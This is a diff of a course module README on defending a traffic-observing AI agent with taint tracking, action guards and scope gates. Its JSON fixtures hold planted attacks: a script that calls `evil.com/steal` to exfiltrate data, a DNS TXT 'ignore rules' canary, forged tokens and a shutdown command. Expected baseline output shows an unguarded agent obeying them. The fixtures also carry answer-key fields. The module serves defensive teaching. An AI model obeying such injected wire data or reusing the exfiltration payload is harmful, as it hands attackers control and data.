@@ -11,9 +11,9 @@ By the end of this module, you will be able to:
 
 1. **Model** intercepted traffic as typed frames (HTTP/DNS/TLS/custom) with per-frame provenance and taint levels
 2. **Propagate** taint from frames through a parser to every extracted field, including nested structures
-3. **Operate** an ephemeral buffer with TTL and secure deletion for credential-like intercepted values
-4. **Enforce** a downstream action guard that blocks high-taint data from sensitive operations (credential storage, system commands)
-5. **Distinguish** scope blocking (source not allowed) from taint blocking (data too dirty) — two different gates for two different questions
+3. **Operate** an ephemeral buffer that bounds, expires, and zeroes its own copy of every parsed intercepted value
+4. **Enforce** a downstream action guard with per-action taint ceilings and a provenance rule that keeps intercepted data out of sensitive operations (credential storage, system commands)
+5. **Distinguish** scope blocking (source or destination not allowed) from taint blocking (data too dirty) — two different gates for two different questions
 
 ---
 
@@ -24,40 +24,44 @@ An agent positioned to observe traffic (monitoring, relay, diagnostics) sees *ev
 1. **The endpoint** — a compromised server sends poisoned responses (fake tokens, injected commands)
 2. **The path** — a man-in-the-middle forges frames wholesale
 
-The defense is a **taint lattice** attached to every datum, plus an **action guard** that asks, before any sensitive operation: *how dirty is the input?*
+The defense is a **taint lattice** attached to every datum, plus an **action guard** that asks, before any sensitive operation: *how dirty is the input, and where did it come from?* Every action has its own taint **ceiling** (observing is cheap; storing a credential is not), and the privileged actions additionally refuse intercepted provenance outright.
 
 ```
   TAINT LATTICE                    ACTION GUARD
-┌────────────────────┐      ┌─────────────────────────────────┐
-│ LOW    trusted     │      │ authorize(action, taint):       │
-│ MEDIUM  clean wire │ ───► │   taint > max_taint?  → BLOCK   │
-│ HIGH   suspicious  │      │   intercepted + not LOW? → BLOCK│
-└────────────────────┘      │   else                → ALLOW   │
-                            └─────────────────────────────────┘
+┌────────────────────┐      ┌──────────────────────────────────────────┐
+│ LOW    trusted     │      │ authorize(action, taint, provenance):    │
+│ MEDIUM  clean wire │ ───► │   taint > ceiling(action)?      → BLOCK  │
+│ HIGH   suspicious  │      │   ceiling LOW + intercepted?    → BLOCK  │
+└────────────────────┘      │   else                          → ALLOW  │
+                            └──────────────────────────────────────────┘
 ```
 
-And a *third* gate upstream of everything: **scope**. Frames from sources outside the allowed list never even get parsed. Keep the three questions straight — this module's most common confusion is blending them:
+And a *third* gate upstream of everything: **scope**. Frames from sources (or to destinations) outside the allowed lists never even get parsed. Keep the three questions straight — this module's most common confusion is blending them:
 
 | Gate | Question | Fails when… |
 |------|----------|-------------|
-| **Scope** | May I listen to this source at all? | Source IP not allowlisted |
-| **Taint** | Is this *datum* clean enough for this *action*? | Field's taint exceeds the action's allowance |
-| **Provenance** | Where did this come from? | (Label attached always; enforced via taint rules) |
+| **Scope** | May I listen to this source at all? | Source or destination IP not allowlisted |
+| **Taint** | Is this *datum* clean enough for this *action*? | Field's taint exceeds the action's ceiling |
+| **Provenance** | Where did this come from? | Action is privileged (ceiling LOW) and the datum is `intercepted_network` — whatever its taint label says |
 
-Plus the **ephemeral buffer**: anything credential-like that *was* parsed lives only briefly (TTL) and is securely overwritten on deletion — because even defended pipelines hold transient secrets.
+Plus the **ephemeral buffer**: every parsed value lives in a bounded, expiring buffer whose own byte copy is zeroed as soon as the frame is decided — because even defended pipelines hold transient secrets.
 
 **Safety framing**: all frames are JSON fixtures. No sockets, no ARP, no capture. The demo simulates the *decision layer* only. `make verify-safety` holds.
 
-### The six frames
+### The eight frames
 
-| Frame | Proto | Source | Taint | Payload of interest |
-|-------|-------|--------|-------|---------------------|
-| frame_001 | HTTP | .10 | HIGH | JSON body with `token` (credential-like) |
-| frame_002 | HTTP | .10 | HIGH | HTML with `fetch('http://evil.com/steal'…)` injection |
-| frame_003 | DNS | .1 | HIGH | TXT record: `CANARY_DNS_INJECTION_IGNORE_RULES` |
-| frame_004 | TLS | .20 | MEDIUM | clean handshake metadata |
-| frame_005 | custom | .30 | HIGH | stream with `{"command": "shutdown"}` injection |
-| frame_006 | HTTP | .10 | MEDIUM | clean 401 response |
+| Frame | Proto | Source | Provenance | Taint | Payload of interest |
+|-------|-------|--------|------------|-------|---------------------|
+| frame_001 | HTTP | .10 | intercepted | HIGH | JSON body with `token` (credential-like) |
+| frame_002 | HTTP | .10 | intercepted | HIGH | HTML with `<script>fetch('http://evil.com/steal'…)</script>` injection |
+| frame_003 | DNS | .1 | intercepted | HIGH | A record `10.0.0.50` + TXT record `CANARY_DNS_INJECTION_IGNORE_RULES` |
+| frame_004 | TLS | .20 | intercepted | MEDIUM | clean handshake metadata |
+| frame_005 | custom | .30 | intercepted | HIGH | stream with a `{"command": "shutdown", …}` chunk on the wire |
+| frame_006 | HTTP | .10 | intercepted | MEDIUM | clean 401 response |
+| frame_007 | HTTP | 10.0.0.99 | intercepted | HIGH | forged `token` from a source outside the allowlist |
+| frame_008 | local | 127.0.0.1 | trusted_local | LOW | operator-supplied credential-rotation record with a `token` |
+
+Two fields in every frame are the **answer key**, not input: `injection` (what the fixture author planted) and `expected` (what each agent should do). The agents never read them — the tests and the results generator do.
 
 ---
 
@@ -69,18 +73,20 @@ Plus the **ephemeral buffer**: anything credential-like that *was* parsed lives 
 cat demo-09-interceptbound/fixtures/traffic.json
 ```
 
-**What this does**: Prints the six frames, the scope policy (`allowed_sources` includes .10/.20/.30/.1; max taint for action = `low`), and the buffer config (size 1000, TTL 60s, secure delete on).
+**What this does**: Prints the eight frames, the scope policy (`allowed_sources` includes .10/.20/.30/.1 and 127.0.0.1; `allowed_destinations` is 192.168.1.100 and 127.0.0.1; the default taint ceiling for actions is `low`, with per-action `action_ceilings`: `record_observation: high`, `update_dns_cache: medium`, `store_credential: low`, `system_shutdown: low`), and the buffer config (size 1000, TTL 60s, secure delete on). Cover the `injection` and `expected` fields while you predict.
 
-**Why it matters**: Note the policy tension you'll spend the module exploring: **max_taint_for_action is `low`**, yet *every* frame carries `intercepted_network` provenance with taint ≥ MEDIUM. Prediction table (fill before running):
+**Why it matters**: Note the policy tension you'll spend the module exploring: **the ceiling for storing a credential is `low`**, yet *every* intercepted frame carries taint ≥ MEDIUM — and the only LOW frame (frame_008) is the operator's own record, not traffic. Prediction table (fill before running):
 
 | Frame | In scope? | Parsed fields | Sensitive action attempted? | Guard verdict |
 |-------|-----------|---------------|------------------------------|---------------|
 | frame_001 (token) | ? | ? | store_token | ? |
-| frame_003 (DNS TXT) | ? | ? | — | ? |
+| frame_003 (DNS A + TXT) | ? | ? | update_dns_cache | ? |
 | frame_004 (TLS) | ? | ? | — | ? |
 | frame_005 (shutdown) | ? | ? | execute_shutdown | ? |
+| frame_007 (forged token, 10.0.0.99) | ? | ? | store_token | ? |
+| frame_008 (local rotation record) | ? | ? | store_token | ? |
 
-Key prediction: with `max=LOW`, *any* intercepted credential-like value must be blocked from storage — even though "observing" it was fine. Observing ≠ retaining ≠ acting. Three different privilege levels for three different operations.
+Key prediction: with `store_credential` capped at LOW, *any* intercepted credential-like value must be blocked from storage — even though "observing" it was fine. Observing ≠ retaining ≠ acting. Three different privilege levels for three different operations. Which is the only frame that can store a token, and why?
 
 ---
 
@@ -102,17 +108,17 @@ frame = TrafficFrame(raw["id"], raw["protocol"], raw["src"], raw["dst"], raw["di
 for p in TaintTracker().parse_frame(frame):
     print(f"{p.name:28} taint={p.taint.value:6} prov={p.provenance.value}  val={str(p.value)[:40]}")
 EOF
-cd ../..
+cd ..
 ```
 
-**What this does**: Parses frame_001 and prints each extracted field with its taint and provenance.
+**What this does**: Parses frame_001 and prints each extracted field with its taint and provenance. (The last constructor argument, `raw["injection"]`, is the fixture's answer key; the parser carries it on the frame but never reads it.)
 
 **Why it matters**: Expected:
 ```
-status                    taint=high   prov=intercepted_network  val=200
-headers.Content-Type      taint=high   prov=intercepted_network  val=application/json
-headers.Server            taint=high   prov=intercepted_network  val=nginx/1.18
-body                      taint=high   prov=intercepted_network  val={"user": "alice", …token…}
+status                       taint=high   prov=intercepted_network  val=200
+headers.Content-Type         taint=high   prov=intercepted_network  val=application/json
+headers.Server               taint=high   prov=intercepted_network  val=nginx/1.18
+body                         taint=high   prov=intercepted_network  val={"user": "alice", "role": "admin", "toke
 ```
 
 Two properties to record:
@@ -126,12 +132,30 @@ Two properties to record:
 ### Step 3: Run the baseline agent
 
 ```bash
-cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Unguarded Baseline/,/^$/p' && cd ../..
+cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Unguarded Baseline/,/^$/p' && cd ..
 ```
 
-**What this does**: Runs the demo's baseline section — no taint, no scope, string-matching triggers.
+**What this does**: Runs the demo's baseline section — the same parser and detection rules as the defended agent, but no scope, no taint, no guard: every candidate action derived from the wire data is "executed".
 
-**Why it matters**: The baseline executes `store_token` on frame_001 (storing an attacker-forgeable credential) and `execute_shutdown` on frame_005 (an injected command). Both actions derive entirely from intercepted bytes. This is the Module 6 vulnerable agent again, but with *state* consequences: a poisoned token in a credential store outlives the session that injected it.
+**Why it matters** — expected (trimmed to the frames that matter):
+
+```
+--- Unguarded Baseline (no scope, no taint, no guard) ---
+  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
+    ALLOWED: record_observation [status]
+    ALLOWED: store_token [body]
+  frame_003 (dns 192.168.1.1:53->192.168.1.100:12345, intercepted_network, taint high):
+    ALLOWED: record_observation [query]
+    ALLOWED: update_dns_cache [answers[0].value]
+    ALLOWED: follow_instruction [answers[1].value_INJECTION]
+  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
+    ALLOWED: execute_shutdown [payload_INJECTION]
+  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
+    ALLOWED: record_observation [status]
+    ALLOWED: store_token [body]
+```
+
+The baseline executes `store_token` on frame_001 (storing an attacker-forgeable credential) and on frame_007 (a forged token from a host it should never have listened to), caches the poisoned DNS answer, follows the injected instructions in frames 002 and 003, and executes `execute_shutdown` on frame_005 — the `{"command": "shutdown"}` chunk sits in the payload itself, right after a benign `{"command": "status"}` chunk. Every one of these actions derives entirely from intercepted bytes. This is the Module 6 vulnerable agent again, but with *state* consequences: a poisoned token in a credential store outlives the session that injected it.
 
 ---
 
@@ -140,26 +164,44 @@ cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/U
 ### Step 4: Run the defended agent
 
 ```bash
-cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Taint-Aware/,/^$/p' && cd ../..
+cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Taint-Aware/,/^$/p' && cd ..
 ```
 
-**What this does**: Runs the defended section: scope check → taint-aware parse → buffer storage → guard-gated actions.
+**What this does**: Runs the defended section: scope check → taint-aware parse → buffer storage → guard-gated actions → buffer purge for that frame.
 
-**Why it matters** — expected highlights:
+**Why it matters** — expected (verbatim):
 
 ```
-frame_001: BLOCKED store_token   (taint_too_high: high > low)
-frame_005: BLOCKED execute_shutdown (taint_too_high: high > low)
-frame_002/003: BLOCKED process_injection (injection_detected)
-frame_004: parsed, observed, no sensitive action attempted
+--- Taint-Aware Guarded (scope -> taint -> buffer -> guard) ---
+  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
+    BLOCKED: store_token (taint_too_high: high > low) [body]
+    ALLOWED: record_observation [status]
+  frame_002 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
+    BLOCKED: process_injection (injection_detected: script_tag,js_exfil) [body_INJECTION]
+    ALLOWED: record_observation [status]
+  frame_003 (dns 192.168.1.1:53->192.168.1.100:12345, intercepted_network, taint high):
+    BLOCKED: update_dns_cache (taint_too_high: high > medium) [answers[0].value]
+    BLOCKED: process_injection (injection_detected: canary_marker,instruction_phrase) [answers[1].value_INJECTION]
+    ALLOWED: record_observation [query]
+  frame_004 (tls 192.168.1.20:443->192.168.1.100:54322, intercepted_network, taint medium):
+    ALLOWED: record_observation [cert_fingerprint]
+  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
+    BLOCKED: process_injection (injection_detected: privileged_command) [payload_INJECTION]
+    BLOCKED: execute_shutdown (taint_too_high: high > low) [payload_INJECTION]
+  frame_006 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint medium):
+    ALLOWED: record_observation [status]
+  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
+    BLOCKED: process_frame (source_not_allowed: 10.0.0.99)
+  frame_008 (local 127.0.0.1->127.0.0.1, trusted_local, taint low):
+    ALLOWED: store_token [body]
 ```
 
-Cross-reference with your Step 1 predictions. Then record the *reasons* — the guard distinguishes:
-- `taint_too_high` — data too dirty for the action (frames 001, 005)
-- `injection_detected` — explicit canary/command found (frames 002, 003)
-- `source_not_allowed` — scope (only when you probe with a foreign source; Step 6)
+Cross-reference with your Step 1 predictions. Note what was **allowed**: an observation from every in-scope intercepted frame, 001 through 006 (HIGH data may drive `record_observation`, whose ceiling is `high`), and exactly one privileged action — `store_token` on frame_008, because its provenance is `trusted_local`. Then record the *reasons* — the guard distinguishes:
+- `taint_too_high` — data too dirty for the action: `high > low` for the token and the shutdown (frames 001, 005), `high > medium` for the DNS cache update (frame 003)
+- `injection_detected` — a named detection rule matched the wire data (frames 002, 003, 005); the rule ids (`script_tag`, `canary_marker`, `privileged_command`, …) say which
+- `source_not_allowed` — scope (frame 007 never reached the parser; Step 6 probes the destination gate too)
 
-Three distinct failure reasons are audit gold: they let an operator tell *which defense* fired, and tune each independently.
+Three distinct failure reasons are audit gold: they let an operator tell *which defense* fired, and tune each independently. A fourth, `intercepted_network_cannot_drive_privileged_action`, appears in the full run's "Provenance rule" section — Step 5 shows where it comes from.
 
 ---
 
@@ -170,29 +212,53 @@ cd demo-09-interceptbound && python3 - << 'EOF'
 import sys; sys.path.insert(0, "student")
 from interceptbound import ActionGuard, TaintLevel, Provenance
 
-g = ActionGuard(TaintLevel.LOW)
+# the fixture's policy: default ceiling LOW, plus per-action ceilings
+g = ActionGuard(TaintLevel.LOW, {"record_observation": "high", "update_dns_cache": "medium",
+                                 "store_credential": "low", "system_shutdown": "low"})
 cases = [
-    ("store_credential", TaintLevel.LOW,   Provenance.TRUSTED_LOCAL),
-    ("store_credential", TaintLevel.MEDIUM,Provenance.INTERCEPTED_NETWORK),
-    ("store_credential", TaintLevel.HIGH,  Provenance.INTERCEPTED_NETWORK),
-    ("log_metric",       TaintLevel.HIGH,  Provenance.INTERCEPTED_NETWORK),
+    ("store_credential",   TaintLevel.LOW,    Provenance.TRUSTED_LOCAL),
+    ("store_credential",   TaintLevel.LOW,    Provenance.INTERCEPTED_NETWORK),
+    ("store_credential",   TaintLevel.MEDIUM, Provenance.INTERCEPTED_NETWORK),
+    ("store_credential",   TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
+    ("update_dns_cache",   TaintLevel.MEDIUM, Provenance.INTERCEPTED_NETWORK),
+    ("update_dns_cache",   TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
+    ("record_observation", TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
+    ("log_metric",         TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
 ]
 for action, taint, prov in cases:
     ok, why = g.authorize(action, taint, "x", prov)
-    print(f"{action:18} taint={taint.value:6} -> {'ALLOW' if ok else 'BLOCK'} ({why})")
+    print(f"{action:18} taint={taint.value:6} prov={prov.value:20} -> {'ALLOW' if ok else 'BLOCK'} ({why})")
 
-print("\n-- same guard, max=MEDIUM --")
+print("\n-- same guard, default ceiling raised to MEDIUM --")
 g2 = ActionGuard(TaintLevel.MEDIUM)
 for taint in TaintLevel:
     ok, why = g2.authorize("report_finding", taint, "x", Provenance.INTERCEPTED_NETWORK)
     print(f"  report taint={taint.value:6} -> {'ALLOW' if ok else 'BLOCK'} ({why})")
 EOF
-cd ../..
+cd ..
 ```
 
-**What this does**: Sweeps the guard across taint levels and provenances at `max=LOW`, then re-sweeps at `max=MEDIUM`.
+**What this does**: Sweeps the guard across actions, taint levels and provenances with the fixture's ceilings, then re-sweeps an undeclared action with the default ceiling raised to MEDIUM.
 
-**Why it matters**: At `max=LOW`, only trusted-local LOW data may act; note the guard's second rule — intercepted-network data requires LOW *regardless* of the max setting, so even at `max=MEDIUM` an intercepted HIGH value is blocked. The lattice and the provenance rule compose. **Design question for your notes**: the `log_metric` case (HIGH taint, low-risk action) is *allowed* — the guard gates actions by their sensitivity, not a blanket ban. Where would you draw the line between "log it" and "store it"?
+**Why it matters**: Expected:
+
+```
+store_credential   taint=low    prov=trusted_local        -> ALLOW (authorized)
+store_credential   taint=low    prov=intercepted_network  -> BLOCK (intercepted_network_cannot_drive_privileged_action)
+store_credential   taint=medium prov=intercepted_network  -> BLOCK (taint_too_high: medium > low)
+store_credential   taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > low)
+update_dns_cache   taint=medium prov=intercepted_network  -> ALLOW (authorized)
+update_dns_cache   taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > medium)
+record_observation taint=high   prov=intercepted_network  -> ALLOW (authorized)
+log_metric         taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > low)
+
+-- same guard, default ceiling raised to MEDIUM --
+  report taint=low    -> ALLOW (authorized)
+  report taint=medium -> ALLOW (authorized)
+  report taint=high   -> BLOCK (taint_too_high: high > medium)
+```
+
+Two rules compose. **Rule 1** is a taint ceiling per action: the field's taint must not exceed the ceiling of the action it would drive, and an action with no declared ceiling gets the default (`low` in the fixture) — fail closed. **Rule 2** concerns only privileged actions (ceiling LOW): intercepted-network data can never drive them, *whatever its taint label says* — row 2 passes rule 1 and is blocked by rule 2 alone. That is the attack rule 2 exists for: a refinement rule that is wrong (Exercise 9.2), or a label an attacker managed to launder, must not be enough to store a credential taken off the wire. In the second sweep the ceiling is MEDIUM, so the HIGH block is rule 1 at work, not rule 2 — rule 2 never fires for a non-privileged action. **Design question for your notes**: the `log_metric` case (HIGH taint, low-risk action) is *blocked*, not because logging is dangerous but because nobody declared a ceiling for it and the default is `low`. The guard gates actions by their sensitivity — but only the sensitivities someone wrote down. Where would you put `log_metric`'s ceiling, and what does it take to justify raising it?
 
 ---
 
@@ -204,20 +270,32 @@ import sys; sys.path.insert(0, "student")
 from interceptbound import TaintAwareAgent, TrafficFrame, Provenance, TaintLevel
 
 agent = TaintAwareAgent(
-    {"allowed_sources": ["192.168.1.10"], "max_taint_for_action": "low"},
+    {"allowed_sources": ["192.168.1.10"], "allowed_destinations": ["192.168.1.100"],
+     "max_taint_for_action": "low"},
     {"max_size": 10, "ttl_seconds": 60, "secure_delete": True},
 )
-frame = TrafficFrame("probe", "http", "10.0.0.1:80", "192.168.1.100:1", "response",
-                     {"body": "shutdown"}, Provenance.INTERCEPTED_NETWORK,
-                     TaintLevel.HIGH, None)
-print(agent.process(frame))
+foreign_src = TrafficFrame("probe_src", "http", "10.0.0.1:80", "192.168.1.100:1", "response",
+                           {"body": '{"command": "shutdown"}'}, Provenance.INTERCEPTED_NETWORK,
+                           TaintLevel.HIGH)
+foreign_dst = TrafficFrame("probe_dst", "http", "192.168.1.10:80", "203.0.113.5:1", "response",
+                           {"body": '{"command": "shutdown"}'}, Provenance.INTERCEPTED_NETWORK,
+                           TaintLevel.HIGH)
+for f in (foreign_src, foreign_dst):
+    print(agent.process(f))
 EOF
-cd ../..
+cd ..
 ```
 
-**What this does**: Feeds the defended agent a frame from a *disallowed* source whose payload contains "shutdown."
+**What this does**: Feeds the defended agent two frames whose body is a `{"command": "shutdown"}` the detector would flag — one from a *disallowed* source, one from an allowed source to a *disallowed* destination.
 
-**Why it matters**: Output: `{'frame': 'probe', 'actions': [], 'blocked': 'source_not_allowed'}` — a *string*, not the list-of-dicts the taint path returns. The frame never reached parsing; the shutdown string was never examined. Two lessons: (a) scope is a pre-filter that short-circuits everything, and (b) **your result schema differs per exit path** — consumers must handle both shapes. (Exercise 5 tightens this.)
+**Why it matters**: Output:
+
+```
+{'frame': 'probe_src', 'actions': [], 'blocked': [{'action': 'process_frame', 'reason': 'source_not_allowed: 10.0.0.1'}], 'parsed_fields': 0, 'taint_tracked': False, 'exit': 'scope_blocked'}
+{'frame': 'probe_dst', 'actions': [], 'blocked': [{'action': 'process_frame', 'reason': 'destination_not_allowed: 203.0.113.5'}], 'parsed_fields': 0, 'taint_tracked': False, 'exit': 'scope_blocked'}
+```
+
+`parsed_fields: 0`: neither frame reached the parser, so the shutdown command was never examined — no `process_injection`, no `execute_shutdown`, nothing in the buffer. Two lessons: (a) scope is a pre-filter that short-circuits everything, and both ends of the connection are checked, and (b) **the result has the same shape on every exit path** — `blocked` is always a list of dicts and `exit` says which gate closed (`scope_blocked` here and for frame_007 in Step 4; `ok` for every frame that was parsed), so a consumer cannot mistake a scope block for an empty result. (Exercise 9.3 adds a third scope question and must keep that shape.)
 
 ---
 
@@ -230,45 +308,64 @@ cd demo-09-interceptbound && python3 - << 'EOF'
 import sys, time; sys.path.insert(0, "student")
 from interceptbound import EphemeralBuffer
 
-buf = EphemeralBuffer(max_size=10, ttl_seconds=1, secure_delete=True)
+buf = EphemeralBuffer(max_size=2, ttl_seconds=1, secure_delete=True)
 buf.add("cred", "DEMO_TOKEN_ABC123")
+raw = buf.raw_copy("cred")            # the buffer's own bytearray copy
 print("immediately:", buf.get("cred"))
 
 buf.delete("cred")
-print("after delete:", buf.get("cred"))
+print("after delete:", buf.get("cred"), "| buffer's copy:", bytes(raw))
 
 buf.add("expiring", "data")
 time.sleep(1.1)
 print("after TTL:  ", buf.get("expiring"))
+
+for i in range(3):
+    buf.add(f"k{i}", f"secret{i}")
+print("after 3 adds at max_size=2:", len(buf), "live; k0 ->", buf.get("k0"))
+print("stats:", buf.stats)
 EOF
-cd ../..
+cd ..
 ```
 
-**What this does**: Demonstrates all three buffer behaviors: immediate read, secure delete (value overwritten then removed), and TTL expiry.
+**What this does**: Demonstrates all four buffer behaviors: immediate read, secure delete (the buffer's own `bytearray` copy is overwritten with zeros, then the entry is dropped), TTL expiry, and size eviction (oldest first, also zeroed).
 
-**Why it matters**: Why does a *defended* pipeline hold intercepted credentials at all? Because parsing requires transient state. The buffer's job is to make that holding *bounded*: TTL caps lifetime, `max_size` caps volume, secure-delete scrubs on eviction. The residual risk — the secret existed in memory for up to 60s — is why the guard *also* blocks storing it anywhere durable. Defense in depth: even the allowed holding is minimized. Record in notes what `secure_delete` can and cannot guarantee in Python (hint: object copies, GC, core dumps).
+**Why it matters**: Expected:
+
+```
+immediately: DEMO_TOKEN_ABC123
+after delete: None | buffer's copy: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+after TTL:   None
+after 3 adds at max_size=2: 2 live; k0 -> None
+stats: {'stored': 5, 'zeroed': 3, 'expired': 1, 'evicted': 1}
+```
+
+Why does a *defended* pipeline hold intercepted credentials at all? Because parsing requires transient state. The buffer's job is to make that holding *bounded*: TTL caps lifetime, `max_size` caps volume, secure-delete zeroes the buffer's copy on delete, expiry, and eviction — and the agent purges every entry of a frame as soon as that frame is decided, which is why the full run ends with `Agent buffer after the run: 0 live entries (stored=27, zeroed=27, expired=0, evicted=0)`. The residual risk is what zeroing *cannot* reach: the `ParsedField` objects, the strings in printed lines, anything the OS swapped out — those copies are dropped, not zeroed. That is why the guard *also* blocks storing the value anywhere durable. Defense in depth: even the allowed holding is minimized. Record in notes what `secure_delete` can and cannot guarantee in Python (hint: object copies, GC, core dumps).
 
 ---
 
 ### Step 8: Run the test suite
 
 ```bash
-cd demo-09-interceptbound && python3 -m pytest tests/ -v && cd ../..
+cd demo-09-interceptbound && python3 -m pytest tests/ -v && cd ..
 ```
 
-**What this does**: Runs all 15 tests. Key pins:
+**What this does**: Runs all 39 tests (`39 passed`). Key pins:
 
 | Test | Pins |
 |------|------|
-| `test_taint_assignment` | Every parsed field inherits frame taint + provenance + source |
-| `test_action_guard_blocks_high_taint` | The Step 5 boundary, as an assertion |
-| `test_baseline_no_taint_tracking` | Baseline *does* execute shutdown (specimen preserved) |
+| `test_every_leaf_inherits_frame_label` | Every parsed field inherits frame taint + provenance + source — MEDIUM frames included |
+| `test_taint_ceiling_per_action` / `test_provenance_rule_blocks_laundered_labels` | The Step 5 boundary, as assertions — rule 1 and rule 2 separately |
+| `test_baseline_executes_from_wire_data_without_annotation` | Baseline *does* execute shutdown, from the payload alone (annotation stripped) |
 | `test_guarded_blocks_shutdown` / `…_token_storage` | The two headline defenses |
-| `test_source_scope_enforcement` | Foreign source → `source_not_allowed` (uses its own frame) |
-| `test_dns_injection_detected` | TXT canary caught in the blocked list |
-| `test_ephemeral_buffer_secure_delete` / `…_ttl` | Buffer semantics |
+| `test_guarded_allows_clean_observations` / `…_privileged_action_from_trusted_provenance` | Something is actually *allowed* (frames 004/006; frame_008's `store_token`) |
+| `test_agent_actually_consults_the_guard` | Swaps in a permissive guard — a canned block would be caught |
+| `test_source_scope_enforced_before_parsing` / `test_destination_scope_enforced` | frame_007 → `source_not_allowed: 10.0.0.99` with the parser never called; foreign destination blocked too |
+| `test_dns_injection_detected_and_cache_update_blocked` | TXT canary caught by name; poisoned A record kept out of the cache |
+| `test_detection_does_not_read_the_annotation` | Every verdict identical with the fixture's `injection` key stripped |
+| `test_secure_delete_zeroes_the_buffers_copy` / `…_max_size_bounds_live_data…` / `…_ttl_expiry…` / `test_pipeline_releases_every_frame_it_decided` | Buffer semantics, and the per-frame purge |
 
-**Why it matters**: Notice `test_source_scope_enforcement` constructs its own frame rather than using a fixture — because after the fixture was widened to let the DNS server in (so its injection could be *tested*), no fixture frame remained that fails scope. When a defense and a test need conflict, the resolution is new fixtures or synthetic probes — never weakening the defense.
+**Why it matters**: Notice `test_source_scope_enforced_before_parsing` does two things: it uses a fixture frame that really fails scope (frame_007, from 10.0.0.99), and it replaces `parse_frame` with a spy to prove the parser was never called. A verdict-only test would pass against a scope gate that fires *after* parsing — pinning the order is what makes the test worth having. The same idea runs through `test_detection_does_not_read_the_annotation` and `test_agent_actually_consults_the_guard`: each asserts a *property* of the mechanism, not the presence of a fixture label.
 
 ---
 
@@ -284,24 +381,24 @@ Add a `seen_nonces` set to the agent. Before processing, extract any `nonce` fro
 ### Standard
 
 **Exercise 9.2 — Taint refinement with justification.**
-Implement `refine(field) -> taint` that downgrades `status`-type fields (numeric HTTP codes, TLS versions) from their frame's taint to MEDIUM, logging each refinement with a rule id. Re-run frame_001: `status` becomes MEDIUM while `body` stays HIGH. Then answer in notes: what attack does refinement enable if your rule list is wrong? Add `test_refinement_only_for_allowlisted_fields`.
+Implement `refine(field) -> taint` that downgrades `status`-type fields (numeric HTTP codes, TLS versions) from their frame's taint to MEDIUM, logging each refinement with a rule id. Re-run frame_001: `status` becomes MEDIUM while `body` stays HIGH. Then answer in notes: what attack does refinement enable if your rule list is wrong — and why does rule 2 limit the damage even then? (`test_exercise_taint_refinement_must_be_justified` is the starting point: a refined MEDIUM `status` may drive `record_observation`, never `store_credential`.) Add `test_refinement_only_for_allowlisted_fields`.
 
 **What this teaches**: Taint *lattice* implies meet/join operations, but every downgrade is a policy claim that must be enumerated and auditable. Default-dirty, refine-with-receipts.
 
-**Exercise 9.3 — Uniform result schema.**
-Fix the Step 6 asymmetry: every `process` return becomes `{"frame", "actions": [], "blocked": [], "parsed_fields": int, "taint_tracked": bool, "exit": "ok"|"scope_blocked"}` with `blocked` always a list of dicts (`{"reason": "source_not_allowed"}`). Update the existing tests, and add `test_scope_blocked_shape`.
+**Exercise 9.3 — Scope by protocol.**
+Add a third scope question: an `allowed_protocols` list in the scope policy, checked in `_in_scope` after source and destination, returning `protocol_not_allowed: <protocol>` for anything else. Keep the uniform result shape from Step 6 (`exit: "scope_blocked"`, `parsed_fields: 0`, `blocked` a list of dicts). Add a fixture frame with an unlisted protocol and write its `expected` block (the results generator compares every verdict against that block and exits 1 on a mismatch, so a new frame without one fails the run). Add `test_protocol_scope_enforced`.
 
-**What this teaches**: Security tooling is also software; inconsistent exit shapes cause downstream *consumers* to fail open (imagine a dashboard treating a string as falsy-empty). Normalize at the boundary.
+**What this teaches**: Security tooling is also software; every new gate must fail closed *and* report through the same shape, or downstream *consumers* start special-casing exits and fail open (imagine a dashboard that only knows how to read `source_not_allowed`). Normalize at the boundary.
 
 ### Extension
 
 **Exercise 9.4 — Omission detection in sequences.**
-Frames carry implicit sequence (frame_001…006). Implement a `SequenceWatcher` expecting contiguous per-source sequence numbers; a gap (frame dropped — perhaps *deliberately* dropped by an attacker suppressing a "revoked credential" message) raises a blocked entry `{"reason": "sequence_gap", "expected": n, "got": m}`. Test with a doctored fixture missing frame_003.
+Frames carry implicit sequence (frame_001…008). Implement a `SequenceWatcher` expecting contiguous per-source sequence numbers; a gap (frame dropped — perhaps *deliberately* dropped by an attacker suppressing a "revoked credential" message) raises a blocked entry `{"reason": "sequence_gap", "expected": n, "got": m}`. Test with a doctored fixture missing frame_003.
 
 **What this teaches**: Integrity isn't only content — *absence* is an attack surface (Module 5's omission lesson, applied to streams).
 
 **Exercise 9.5 — Credential-canary lifecycle.**
-When a credential-like value (regex `token|secret|password|bearer`, case-insensitive) is parsed: (1) never buffer the real value — buffer `sha256(value)[:12]` plus a canary `CANARY_CRED_<n>`; (2) emit a blocked entry `{"action": "store_token", "reason": "credential_canary_quarantined", "fingerprint": …}`. Demonstrate that the buffer never contains `DEMO_TOKEN_ABC123` but the audit log identifies which frame carried it.
